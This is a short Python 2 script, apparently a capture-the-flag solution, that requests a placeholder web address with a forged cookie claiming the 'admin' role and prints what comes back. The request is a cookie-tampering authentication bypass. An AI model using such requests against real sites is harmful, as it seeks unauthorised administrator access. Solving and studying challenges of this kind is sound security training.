#!/usr/bin/python

import requests

r = requests.get('http://ip:port/', cookies = {"Who are you?" : "admin"})
print r.text
